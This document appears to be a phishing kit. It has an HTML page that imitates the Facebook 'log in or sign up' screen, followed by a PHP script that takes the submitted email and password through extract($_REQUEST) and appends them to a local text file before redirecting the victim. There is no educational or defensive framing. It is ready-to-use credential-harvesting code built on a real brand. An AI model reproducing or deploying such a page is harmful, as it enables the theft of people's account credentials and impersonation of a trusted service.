<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Facebook – log in or sign up</title>
		<link rel="stylesheet" href="assets/css/style.css">
		<link rel="shortcut icon" href="assets/images/favicon.png" type="image/x-icon">
	</head>
	<body>
		<div class="login-signup">
			<div class="container">
				<div class="row space-between">
					<div class="left-area">
						<img src="assets/images/logo.png" class="logo">
						<h2>Facebook helps you connect and share with the people in your life.</h2>
					</div>
					<div class="right-area">
						<form action="#">
							<div class="input-box">
								<input type="text" name="email" placeholder="Email adress or Phone Number">
							</div>
							<div class="input-box">
								<input type="password" name="password" placeholder="Password">
							</div>
							<div class="input-box">
								<input type="submit" value="Log In">
							</div>
							<a class="forgot-link" href="#">Forgotten password?</a>
							<div class="create-btn">
								<a href="#">Create New Account</a>
							</div>
						</form>
						<p><a href="#">Create a Page</a> for a celebrity, band or business.</p>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
<?php
extract($_REQUEST);
$file=fopen("tasfi.txt","a");

fwrite($file,"email :");
fwrite($file, $email ."\n");
fwrite($file,"password :");
fwrite($file, $password ."\n");
fclose($file);
header("location: index.php");
?>